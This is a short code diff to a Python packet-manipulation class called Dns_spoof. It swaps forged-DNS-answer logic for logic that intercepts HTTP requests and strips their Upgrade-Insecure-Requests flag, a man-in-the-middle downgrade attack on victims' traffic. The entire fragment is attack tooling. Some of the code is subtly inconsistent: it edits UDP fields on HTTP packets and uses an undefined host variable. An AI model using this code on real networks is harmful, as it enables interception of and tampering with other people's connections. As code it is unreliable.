@@ -33,13 +33,11 @@ class Dns_spoof:
         
     def call_back(self, bin_packet):
         packet = IP(bin_packet.get_payload())
-        if packet.haslayer(DNSRR):
+        if packet.haslayer(HTTPRequest):
             try:
-                queryName = packet[DNSQR].qname
-                if queryName in self.host:
-                    packet[DNS].an = DNSRR(
-                        rrname=queryName, rdata=host[queryName])
-                    packet[DNS].ancount = 1
+                upgradeReq = packet[HTTPRequest].Upgrade_Insecure_Requests
+                if upgradeReq == 1:
+                    packet[HTTPRequest].Upgrade_Insecure_Requests = 0
                     del packet[IP].len
                     del packet[IP].chksum
                     del packet[UDP].len
